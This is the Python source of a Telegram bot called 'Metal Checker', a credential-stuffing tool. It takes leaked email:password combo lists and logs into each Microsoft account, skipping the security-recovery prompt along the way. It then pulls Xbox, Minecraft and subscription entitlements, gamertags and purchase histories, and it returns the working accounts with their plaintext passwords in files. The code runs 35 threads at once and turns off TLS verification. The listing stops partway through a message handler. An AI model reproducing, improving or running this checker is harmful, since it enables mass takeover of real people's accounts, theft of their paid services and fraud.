import os
import re
import time
import uuid
import json
import threading
import concurrent.futures
import io
import sys
import logging
from datetime import datetime
import requests
import urllib3
import warnings
import telebot
from telebot import types
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ==============================================================================
# ⚙️ DETAILED LOGGING ENGINE & SYSTEM CONFIGURATION
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] (%(threadName)s) %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("MetalCheckerPro")

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))

# Orijinal, en kararlı tekil thread yapısı
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
database_lock = threading.Lock()

# Global ağ istekleri için yüksek dirençli session konfigürasyonu
session_tg = requests.Session()
retries = Retry(total=7, backoff_factor=1.5, status_forcelist=[429, 500, 502, 503, 504])
session_tg.mount("https://", HTTPAdapter(max_retries=retries))

def safe_bot_call(func, *args, **kwargs):
    """Telebot çağrılarını sarmalayan hata geçirmez koruma kalkanı"""
    try:
        return func(*args, **kwargs)
    except telebot.apihelper.ApiTelegramException as e:
        logger.error(f"[Telegram API Exception]: {e.description} (Code: {e.error_code})")
        if e.error_code == 409:
            logger.critical("CONFLICT DETECTED! Diğer bot instance'ını kapatın.")
        return None
    except Exception as e:
        logger.error(f"[Genel Bot Çağrı Hatası]: {e}")
        return None

# ==============================================================================
# 💾 DATABASE MANAGEMENT MIGRATION ENGINE
# ==============================================================================
DATA_FILE = "bot_data.json"

def initialize_database():
    with database_lock:
        if os.path.exists(DATA_FILE):
            try:
                with open(DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    # Eksik kök anahtarları tamamla
                    for key in ["admins", "users", "keys", "channels", "stats_global"]:
                        if key not in data:
                            data[key] = [] if isinstance(data.get(key), list) else {}
                    return data
            except Exception as e:
                logger.error(f"Veritabanı okuma hatası, sıfırlanıyor: {e}")
        
        return {
            "admins": [OWNER_ID],
            "users": {},
            "keys": {},
            "channels": [],
            "stats_global": {
                "total_checked_accounts": 0,
                "total_hits_found": 0,
                "total_bad_accounts": 0,
                "total_2fa_accounts": 0
            }
        }

db = initialize_database()

def save_db():
    with database_lock:
        try:
            with open(DATA_FILE, "w", encoding="utf-8") as f:
                json.dump(db, f, ensure_ascii=False, indent=4)
        except Exception as e:
            logger.error(f"Veritabanı yazma hatası: {e}")

if OWNER_ID not in db["admins"]:
    db["admins"].append(OWNER_ID)
    save_db()

# ==============================================================================
# 🌍 ADVANCED MULTI-LANGUAGE LOCALIZATION SYSTEM
# ==============================================================================
LANG = {
    "tr": {
        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!*\n\nLütfen devam etmek için bir dil seçin / Please choose a language to continue:",
        "main_menu": "📱 *Ana Menü*\n\nLütfen yapmak istediğiniz işlemi aşağıdaki menüden seçiniz:",
        "btn_check": "🚀 Hesap Tara (.txt)",
        "btn_merge": "📂 Dosya Birleştir",
        "btn_stats": "📊 İstatistiklerim",
        "btn_lang": "🌐 Dil Değiştir (Language)",
        "scan_started": "🚀 *Tarama arka planda başarıyla başlatıldı!*\n\n⚠️ İstediğiniz zaman /stats yazarak veya ana menüden *📊 İstatistiklerim* butonuna basarak taramanın anlık canlı durumunu raporlayabilirsiniz.",
        "filter_prompt": "🔍 Aranacak spesifik bir oyun adı (Örn: *Minecraft*, *Sea of Thieves*) girin veya filtreleme yapmadan geçmek için aşağıdaki *skip* butonuna basın:",
        "invalid_file": "❌ Lütfen geçerli bir `.txt` uzantılı combo liste dosyası gönderiniz.",
        "no_combo_found": "❌ Gönderilen dosya içerisinde geçerli formatta (email:şifre) hesap bulunamadı.",
        "already_scanning": "⚠️ Halihazırda devam eden bir tarama işleminiz bulunuyor. Lütfen bitmesini bekleyin veya /stop komutu ile durdurun.",
        "scan_stopped": "🛑 Devam eden tarama işleminiz kullanıcı isteği doğrultusunda durduruldu.",
        "no_active_scan": "❌ Şu anda aktif bir tarama işleminiz bulunmamaktadır.",
        "merge_prompt": "📂 Lütfen birleştirmek istediğiniz `.txt` dosyalarını tek tek bota gönderin. Gönderim işlemi bittiğinde /done yazarak birleştirilmiş temiz dosyanızı alın.",
        "merge_success": "✅ Toplam {count} adet benzersiz (de-duplicate) hesap başarıyla birleştirildi ve temizlendi!",
        "stats_title": "📊 *ANLIK TARAMA DURUMUNUZ* 📊",
        "sub_gp_ultimate": "💎 Game Pass Ultimate",
        "sub_gp_pc": "💻 Game Pass PC",
        "sub_gp_essential": "🟢 Game Pass Core (Essential)",
        "sub_gp_standard": "🎮 Game Pass Standard",
        "sub_gp_core": "⚙️ Xbox Live Gold / Core",
        "sub_minecraft": "🟩 Minecraft Java / Capes",
        "sub_m365_family": "📦 Microsoft 365 Aile",
        "sub_m365_personal": "👤 Microsoft 365 Bireysel",
        "sub_m365_business": "🏢 Microsoft 365 İş",
        "sub_onedrive": "☁️ OneDrive Depolama",
        "sub_clipchamp": "🎬 Clipchamp Premium",
        "sub_eaplay": "🎮 EA Play Üyeliği",
        "sub_ubisoft": "🦅 Ubisoft+ Aboneliği",
        "sub_riot": "🔥 Riot Games Avantajları",
        "sub_gta": "🚗 GTA+ Üyeliği",
        "sub_fallout": "☢️ Fallout 1st",
        "sub_vstudio": "💻 Visual Studio Aboneliği",
        "sub_azure": "🚀 Azure Kredileri",
        "sub_copilot": "🤖 GitHub Copilot",
        "sub_dev": "🛠️ Xbox Geliştirici Hesabı",
        "sub_realms": "🧱 Minecraft Realms",
        "sub_win365": "🖥️ Windows 365 Bulut PC",
        "sub_casual": "🎲 Casual Games Premium",
        "stat_hit": "🟢 Hit (Oyunlu/Abonelikli)",
        "stat_bad": "🔴 Hatalı (Bad)",
        "stat_2fa": "🟡 İki Faktörlü Korumalı (2FA)",
        "stat_error": "⚠️ Ağ/Sistem Hatası",
        "stat_progress": "📈 İlerleme Durumu",
        "scan_completed_msg": "📦 *Tarama işleminiz başarıyla tamamlandı!* Sonuç dosyalarınız aşağıda hazırlanmıştır:"
    },
    "en": {
        "welcome": "👋 *Welcome to Metal Checker Bot!*\n\nPlease choose a language to continue / Lütfen devam etmek için bir dil seçin:",
        "main_menu": "📱 *Main Menu*\n\nPlease choose an option from the menu below:",
        "btn_check": "🚀 Scan Accounts (.txt)",
        "btn_merge": "📂 Merge Files",
        "btn_stats": "📊 My Statistics",
        "btn_lang": "🌐 Change Language",
        "scan_started": "🚀 *Scan successfully started in the background!*\n\n⚠️ You can report the instant live status of the scan at any time by typing /stats or clicking the *📊 My Statistics* button in the main menu.",
        "filter_prompt": "🔍 Enter a specific game name to search for (e.g., *Minecraft*, *Sea of Thieves*) or press the *skip* button below to proceed without filtering:",
        "invalid_file": "❌ Please send a valid combo list file with a `.txt` extension.",
        "no_combo_found": "❌ No accounts found in the valid format (email:password) inside the sent file.",
        "already_scanning": "⚠️ You already have an active scan running. Please wait for it to finish or stop it using the /stop command.",
        "scan_stopped": "🛑 Your ongoing scanning process has been stopped by user request.",
        "no_active_scan": "❌ You do not have an active scanning process at the moment.",
        "merge_prompt": "📂 Please send the `.txt` files you want to merge to the bot one by one. When done, type /done to receive your clean merged file.",
        "merge_success": "✅ A total of {count} unique (de-duplicated) accounts were successfully merged and cleaned!",
        "stats_title": "📊 *YOUR INSTANT LIVE SCAN STATUS* 📊",
        "sub_gp_ultimate": "💎 Game Pass Ultimate",
        "sub_gp_pc": "💻 Game Pass PC",
        "sub_gp_essential": "🟢 Game Pass Core (Essential)",
        "sub_gp_standard": "🎮 Game Pass Standard",
        "sub_gp_core": "⚙️ Xbox Live Gold / Core",
        "sub_minecraft": "🟩 Minecraft Java / Capes",
        "sub_m365_family": "📦 Microsoft 365 Family",
        "sub_m365_personal": "👤 Microsoft 365 Personal",
        "sub_m365_business": "🏢 Microsoft 365 Business",
        "sub_onedrive": "☁️ OneDrive Storage",
        "sub_clipchamp": "🎬 Clipchamp Premium",
        "sub_eaplay": "🎮 EA Play Membership",
        "sub_ubisoft": "🦅 Ubisoft+ Subscription",
        "sub_riot": "🔥 Riot Games Perks",
        "sub_gta": "🚗 GTA+ Membership",
        "sub_fallout": "☢️ Fallout 1st",
        "sub_vstudio": "💻 Visual Studio Subscription",
        "sub_azure": "🚀 Azure Credits",
        "sub_copilot": "🤖 GitHub Copilot",
        "sub_dev": "🛠️ Xbox Developer Account",
        "sub_realms": "🧱 Minecraft Realms",
        "sub_win365": "🖥️ Windows 365 Cloud PC",
        "sub_casual": "🎲 Casual Games Premium",
        "stat_hit": "🟢 Hit (With Game/Sub)",
        "stat_bad": "🔴 Bad Accounts",
        "stat_2fa": "🟡 Two-Factor Auth (2FA)",
        "stat_error": "⚠️ Network/System Error",
        "stat_progress": "📈 Progress Status",
        "scan_completed_msg": "📦 *Your scan has been successfully completed!* Your result files have been prepared below:"
    }
}

def get_text(user_id, key):
    lang = db["users"].get(str(user_id), {}).get("lang", "en")
    return LANG[lang].get(key, LANG["en"].get(key, key))

def lang_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("Türkçe 🇹🇷", callback_data="set_lang_tr"),
               types.InlineKeyboardButton("English 🇺🇸", callback_data="set_lang_en"))
    return markup

def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.row(get_text(user_id, "btn_check"), get_text(user_id, "btn_merge"))
    markup.row(get_text(user_id, "btn_stats"), get_text(user_id, "btn_lang"))
    return markup

# ==============================================================================
# 🧠 MICROSOFT & XBOX CORE AUTH AUTOMATION PIPELINE
# ==============================================================================
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

# Gelişmiş simüle edilmiş tarayıcı başlıkları
CORE_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
}

def get_sftag(session):
    """Microsoft login akışını başlatan PPFT (sftag) ve dinamik login URL yakalayıcı"""
    try:
        response = session.get(SFTAG_URL, headers=CORE_HEADERS, timeout=12)
        text     = response.text
        match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sftag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match: 
                return match.group(1), sftag
    except Exception as e:
        logger.debug(f"sftag parsing error: {e}")
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    """Microsoft OAuth akışında kimlik doğrulama gerçekleştiren ana fonksiyon"""
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
        headers = dict(CORE_HEADERS, **{'Content-Type': 'application/x-www-form-urlencoded'})
        
        login_request = session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=12)
        
        if '#' in login_request.url and login_request.url != SFTAG_URL:
            from urllib.parse import urlparse, parse_qs
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": 
                return token, "success"
                
        elif 'cancel?mkt=' in login_request.text:
            try:
                d = {
                    'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                ret        = session.post(action_url, data=d, allow_redirects=True, timeout=12)
                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                fin        = session.get(return_url, allow_redirects=True, timeout=12)
                token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None": 
                    return token, "success"
            except Exception as inner_ex:
                logger.debug(f"Arka kapı iptal bypass hatası: {inner_ex}")
                
        elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return None, "2fa"
        elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
            return None, "bad"
    except Exception as e:
        logger.debug(f"Microsoft auth exception: {e}")
    return None, "error"

def get_xbox_token(session, ms_token):
    try:
        payload  = {
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }
        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=12)
        if response.status_code == 200:
            data = response.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except Exception as e:
        logger.debug(f"Xbox token fetch error: {e}")
    return None, None

def get_xsts_token(session, xbox_token):
    try:
        payload  = {
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
            "RelyingParty": "rp://api.minecraftservices.com/",
            "TokenType": "JWT"
        }
        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=12)
        if response.status_code == 200: 
            return response.json().get('Token')
    except Exception as e:
        logger.debug(f"XSTS token error: {e}")
    return None

def get_minecraft_token(session, uhs, xsts_token):
    try:
        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=12)
        if response.status_code == 200: 
            return response.json().get('access_token')
    except Exception as e:
        logger.debug(f"Minecraft token error: {e}")
    return None

def check_entitlements(session, mc_token):
    """Hesabın sahip olduğu tüm Microsoft aboneliklerini ve Minecraft lisans durumunu yakalar"""
    found_subs = []
    main_type = None
    try:
        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=12)
        if response.status_code == 200:
            text = response.text
            text_lower = text.lower()
            
            days_left_str = ""
            expiry_match = re.search(r'"expirydate"\s*:\s*"([^"]+)"', text_lower) or re.search(r'"enddate"\s*:\s*"([^"]+)"', text_lower)
            if expiry_match:
                try:
                    exp_raw = expiry_match.group(1).split("t")[0]
                    diff = (datetime.strptime(exp_raw, "%Y-%m-%d") - datetime.now()).days
                    days_left_str = f" ({diff}D Left)" if diff > 0 else " (Expired)"
                except: pass

            if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
            elif 'product_game_pass_pc' in text_lower or 'pc_game_pass' in text_lower: found_subs.append(f"Game Pass PC💻{days_left_str}")
            elif 'essential' in text_lower: found_subs.append(f"Game Pass Essential🟢{days_left_str}")
            elif 'standard' in text_lower: found_subs.append(f"Game Pass Standard🎮{days_left_str}")
            elif 'core' in text_lower or 'xbox_live_gold' in text_lower: found_subs.append(f"Game Pass Core⚙️{days_left_str}")
            
            if 'family' in text_lower: found_subs.append("Microsoft 365 Family")
            if 'personal' in text_lower: found_subs.append("Microsoft 365 Personal")
            if 'business' in text_lower: found_subs.append("Microsoft 365 Business")
            if 'onedrive' in text_lower: found_subs.append("OneDrive Storage")
            if 'clipchamp' in text_lower: found_subs.append("Clipchamp Premium")
            if 'ea play' in text_lower or 'ea_membership' in text_lower: found_subs.append("EA Play")
            if 'ubisoft' in text_lower: found_subs.append("Ubisoft+")
            if 'riot' in text_lower: found_subs.append("Riot Games Perks")
            if 'gta' in text_lower: found_subs.append("GTA+")
            if 'fallout 1st' in text_lower: found_subs.append("Fallout 1st")
            if 'visual studio' in text_lower or 'msdn' in text_lower: found_subs.append("Visual Studio Sub")
            if 'azure' in text_lower: found_subs.append("Azure Credits 🚀")
            if 'copilot' in text_lower: found_subs.append("GitHub Copilot")
            if 'developer' in text_lower: found_subs.append("Xbox Dev Account")
            if 'realms' in text_lower: found_subs.append("Minecraft Realms")
            if 'windows 365' in text_lower: found_subs.append("Windows 365 Cloud")
            if 'casual games' in text_lower: found_subs.append("Casual Games Premium")

            if 'product_game_pass_ultimate' in text: main_type = 'Xbox Game Pass Ultimate'
            elif 'product_game_pass_pc' in text: main_type = 'Xbox Game Pass'
            elif '"product_minecraft"' in text: main_type = 'Minecraft'
    except Exception as e:
        logger.debug(f"Entitlements query error: {e}")
    return main_type, found_subs

def get_xbox_profile(session, uhs, xsts_token):
    try:
        response = session.get(
            "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier", 
            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}, 
            timeout=12
        )
        if response.status_code == 200:
            settings = {s["id"]: s.get("value", "N/A") for s in response.json().get("profileUsers", [{}])[0].get("settings", [])}
            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
    except Exception as e:
        logger.debug(f"Xbox profile parsing error: {e}")
    return {"gamertag": "N/A", "tier": "N/A"}

def get_payment_transactions(session, ms_token):
    """Kullanıcının geçmişte veya güncel olarak faturalandırılmış tüm dijital satın alımlarını listeler"""
    try:
        url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        response = session.get(url, headers={"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}, timeout=12)
        if response.status_code == 200:
            games = []
            for item in response.json().get("transactions", []):
                title = item.get("description") or item.get("productName")
                if title: 
                    games.append(title)
            return list(set(games))
    except Exception as e:
        logger.debug(f"Transaction logging error: {e}")
    return []

# ==============================================================================
# 🔄 CONTEXT STATE MANAGEMENT (NO DYNAMIC THREAD ATTACK TO TELEGRAM)
# ==============================================================================
active_scans = {}
user_game_filter = {}
user_merge_files = {}

class BotScanContext:
    def __init__(self, chat_id, user_id, combos, filter_str="skip"):
        self.chat_id = chat_id
        self.user_id = user_id
        self.combos = combos
        self.total = len(combos)
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0

        # İstatistik odaları
        self.gp_ultimate = 0
        self.gp_pc = 0
        self.gp_essential = 0
        self.gp_standard = 0
        self.gp_core = 0
        self.m365_family = 0
        self.m365_personal = 0
        self.m365_business = 0
        self.onedrive = 0
        self.clipchamp = 0
        self.eaplay = 0
        self.ubisoft = 0
        self.riot = 0
        self.gta = 0
        self.fallout = 0
        self.vstudio = 0
        self.azure = 0
        self.copilot = 0
        self.dev_acc = 0
        self.realms = 0
        self.win355 = 0
        self.casual = 0
        self.minecraft_java = 0

        self.hit_list = []
        self.bad_list = []
        self.twofa_list = []
        self.not_linked_list = []
        self.purchased_items_list = [] 
        self.subscriptions_list = [] 

        self.filter_str = filter_str.lower().strip()
        self.is_running = True
        self.lock = threading.Lock()

def check_account_bot(context, combo):
    if not context.is_running: 
        return
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with context.lock: 
                context.bad += 1
                context.checked += 1
            return

        email, password = parts[0], ':'.join(parts[1:])
        session = requests.Session()
        session.verify = False
        session.headers.update(CORE_HEADERS)

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag: 
            raise Exception("sftag_extraction_failed")

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        if auth_status == "2fa":
            with context.lock: 
                context.twofa += 1
                context.checked += 1
                context.twofa_list.append(combo)
            return
        elif auth_status == "bad":
            with context.lock: 
                context.bad += 1
                context.checked += 1
                context.bad_list.append(combo)
            return
        elif auth_status != "success" or not ms_token: 
            raise Exception("microsoft_token_invalid")

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs: 
            raise Exception("xbox_auth_failed")

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token: 
            raise Exception("xsts_handshake_failed")

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token: 
            raise Exception("minecraft_auth_failed")

        account_type, subs = check_entitlements(session, mc_token)
        purchased_games = get_payment_transactions(session, ms_token)

        if context.filter_str != "skip":
            if not any(context.filter_str in g.lower() for g in purchased_games):
                with context.lock: 
                    context.checked += 1
                return

        has_premium_sub = len(subs) > 0
        has_any_game = len(purchased_games) > 0

        capture_detail = (
            f"Email         : {email}\nPassword      : {password}\n"
            f"Gamertag      : {xbox_profile.get('gamertag')}\nTier          : {xbox_profile.get('tier')}\n"
            f"Subscriptions : {', '.join(subs) if has_premium_sub else 'None'}\nGames Count   : {len(purchased_games)}\n{'='*50}"
        )

        with context.lock:
            context.checked += 1
            if not has_premium_sub and not has_any_game:
                context.not_linked_list.append(capture_detail)
            else:
                context.hits += 1
                context.hit_list.append(f"{email}:{password}")
                
                if has_any_game:
                    games_str = "\n".join([f"{i} - {g}" for i, g in enumerate(purchased_games, 1)])
                    context.purchased_items_list.append(f"Email: {email}\nPassword: {password}\nGamesList:\n{games_str}\n— Checker by Icardi\n{'='*50}\n")

                if has_premium_sub:
                    sub_entry = f"Email: {email} | Pass: {password}\nActive Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + f"\n{'-'*40}\n"
                    context.subscriptions_list.append(sub_entry)

            if account_type and 'Minecraft' in account_type: 
                context.minecraft_java += 1
            for s in subs:
                sl = s.lower()
                if "ultimate" in sl: context.gp_ultimate += 1
                elif "pc" in sl: context.gp_pc += 1
                elif "essential" in sl: context.gp_essential += 1
                elif "standard" in sl: context.gp_standard += 1
                elif "core" in sl or "gold" in sl: context.gp_core += 1
                elif "family" in sl: context.m365_family += 1
                elif "personal" in sl: context.m365_personal += 1
                elif "business" in sl: context.m365_business += 1
                elif "onedrive" in sl: context.onedrive += 1
                elif "clipchamp" in sl: context.clipchamp += 1
                elif "ea play" in sl: context.eaplay += 1
                elif "ubisoft" in sl: context.ubisoft += 1
                elif "riot" in sl: context.riot += 1
                elif "gta" in sl: context.gta += 1
                elif "fallout" in sl: context.fallout += 1
                elif "visual studio" in sl: context.vstudio += 1
                elif "azure" in sl: context.azure += 1
                elif "copilot" in sl: context.copilot += 1
                elif "developer" in sl: context.dev_acc += 1
                elif "realms" in sl: context.realms += 1
                elif "windows 365" in sl: context.win355 += 1
                elif "casual" in sl: context.casual += 1
    except Exception as e:
        logger.debug(f"Account check loop structural crack: {e}")
        with context.lock: 
            context.errors += 1
            context.checked += 1

def generate_panel_text(context):
    """İstatistikleri ve ilerlemeyi tam yerelleştirilmiş dille derleyen metin motoru"""
    uid = context.user_id
    pct = (context.checked / context.total) * 100 if context.total > 0 else 0
    return (
        f"⚡ *METAL CHECKER ANLIK PANEL v6.0* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"*{get_text(uid, 'stat_hit')}*: `{context.hits}`\n"
        f"*{get_text(uid, 'stat_bad')}*: `{context.bad}`\n"
        f"*{get_text(uid, 'stat_2fa')}*: `{context.twofa}`\n"
        f"*{get_text(uid, 'stat_error')}*: `{context.errors}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 *{get_text(uid, 'stats_title')}* 📊\n"
        f"{get_text(uid, 'sub_gp_ultimate')}: `{context.gp_ultimate}`\n"
        f"{get_text(uid, 'sub_gp_pc')}: `{context.gp_pc}`\n"
        f"{get_text(uid, 'sub_gp_essential')}: `{context.gp_essential}`\n"
        f"{get_text(uid, 'sub_gp_standard')}: `{context.gp_standard}`\n"
        f"{get_text(uid, 'sub_gp_core')}: `{context.gp_core}`\n"
        f"{get_text(uid, 'sub_minecraft')}: `{context.minecraft_java}`\n"
        f"{get_text(uid, 'sub_m365_family')}: `{context.m365_family}`\n"
        f"{get_text(uid, 'sub_m365_personal')}: `{context.m365_personal}`\n"
        f"{get_text(uid, 'sub_m365_business')}: `{context.m365_business}`\n"
        f"{get_text(uid, 'sub_onedrive')}: `{context.onedrive}`\n"
        f"{get_text(uid, 'sub_clipchamp')}: `{context.clipchamp}`\n"
        f"{get_text(uid, 'sub_eaplay')}: `{context.eaplay}`\n"
        f"{get_text(uid, 'sub_ubisoft')}: `{context.ubisoft}`\n"
        f"{get_text(uid, 'sub_riot')}: `{context.riot}`\n"
        f"{get_text(uid, 'sub_gta')}: `{context.gta}`\n"
        f"{get_text(uid, 'sub_fallout')}: `{context.fallout}`\n"
        f"{get_text(uid, 'sub_vstudio')}: `{context.vstudio}`\n"
        f"{get_text(uid, 'sub_azure')}: `{context.azure}`\n"
        f"{get_text(uid, 'sub_copilot')}: `{context.copilot}`\n"
        f"{get_text(uid, 'sub_dev')}: `{context.dev_acc}`\n"
        f"{get_text(uid, 'sub_realms')}: `{context.realms}`\n"
        f"{get_text(uid, 'sub_win365')}: `{context.win355}`\n"
        f"{get_text(uid, 'sub_casual')}: `{context.casual}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"*{get_text(uid, 'stat_progress')}*: `[{context.checked}/{context.total}]` — `% {pct:.1f}`"
    )

def background_execution_pool(context):
    """Tarama bittiğinde çıktı dosyalarını güvenli şekilde gönderen arka plan işçisi"""
    with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
        futures = [executor.submit(check_account_bot, context, cb) for cb in context.combos]
        concurrent.futures.wait(futures)
    
    # Global DB istatistiklerini güncelle
    with database_lock:
        db["stats_global"]["total_checked_accounts"] += context.checked
        db["stats_global"]["total_hits_found"] += context.hits
        db["stats_global"]["total_bad_accounts"] += context.bad
        db["stats_global"]["total_2fa_accounts"] += context.twofa
        save_db()

    safe_bot_call(bot.send_message, context.chat_id, get_text(context.user_id, "scan_completed_msg"), parse_mode="Markdown")
    
    if context.purchased_items_list:
        bio = io.BytesIO("\n".join(context.purchased_items_list).encode('utf-8'))
        bio.name = "purchased_items.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🎮 purchased_items.txt ({len(context.purchased_items_list)} Acc)")

    if context.subscriptions_list:
        bio = io.BytesIO("\n".join(context.subscriptions_list).encode('utf-8'))
        bio.name = "Subscriptions.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"📄 Subscriptions.txt ({len(context.subscriptions_list)} Acc)")

    if context.not_linked_list:
        bio = io.BytesIO("\n".join(context.not_linked_list).encode('utf-8'))
        bio.name = "NotLinked.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🟨 NotLinked.txt ({len(context.not_linked_list)} Empty Acc)")

    if context.hit_list:
        bio = io.BytesIO("\n".join(context.hit_list).encode('utf-8'))
        bio.name = "All_Hits_Short.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption="✅ All Hits Short List")

    if context.chat_id in active_scans: 
        del active_scans[context.chat_id]

# ==============================================================================
# 🚀 TELEGRAM COMMAND & INTERACTION HANDLERS
# ==============================================================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid_str = str(message.from_user.id)
    if uid_str not in db["users"]:
        db["users"][uid_str] = {"lang": "en", "expiry": "2026-12-31", "tier": "PREMIUM"}
        save_db()
    safe_bot_call(bot.send_message, message.chat.id, LANG["en"]["welcome"], reply_markup=lang_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    chat_id = message.chat.id
    if chat_id in active_scans:
        active_scans[chat_id].is_running = False
        safe_bot_call(bot.send_message, chat_id, get_text(message.from_user.id, "scan_stopped"), reply_markup=main_keyboard(message.from_user.id))
        del active_scans[chat_id]
    else:
        safe_bot_call(bot.send_message, chat_id, get_text(message.from_user.id, "no_active_scan"))

@bot.message_handler(commands=['stats'])
def cmd_stats_direct(message):
    """Canlı sonuçları kullanıcının manuel tetiklemesiyle fırlatan sistem"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    if chat_id in active_scans:
        context = active_scans[chat_id]
        text = generate_panel_text(context)
        safe_bot_call(bot.send_message, chat_id, text, parse_mode="Markdown")
    else:
        # Taraması yoksa veritabanındaki genel verileri göster
        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "no_active_scan"))

@bot.message_handler(commands=['done'])
def cmd_done_merge(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if user_id in user_merge_files and user_merge_files[user_id]:
        all_combos = user_merge_files[user_id]
        unique_combos = list(set(all_combos))
        
        bio = io.BytesIO("\n".join(unique_combos).encode('utf-8'))
        bio.name = "Merged_Clean_Combos.txt"
        
        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "merge_success").format(count=len(unique_combos)))
        safe_bot_call(bot.send_document, chat_id, bio, caption="📂 Merged & De-duplicated File")
        user_merge_files[user_id] = []
    else:
        safe_bot_call(bot.send_message, chat_id, get_text(user_id, "invalid_file"))

def process_game_filter_step(message):
    user_game_filter[message.from_user.id] = message.text.strip()
    safe_bot_call(bot.send_message, message.chat.id, "📥 Filter locked! Now please send your `.txt` file.")

@bot.message_handler(func=lambda msg: True, content_types=['text', 'document'])
def handle_all_operations(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.content_type == 'text':
        text = message.text
        if text == get_text(user_id, "btn_lang"):
            safe_bot_call(bot.send_message, chat_id, "Select Language / Dil Seçin:", reply_markup=lang_keyboard())
        elif text == get_text(user_id, "btn_check"):
            if chat_id in active_scans:
                safe_bot_call(bot.send_message, chat_id, get_text(user_id, "already_scanning"))
                return
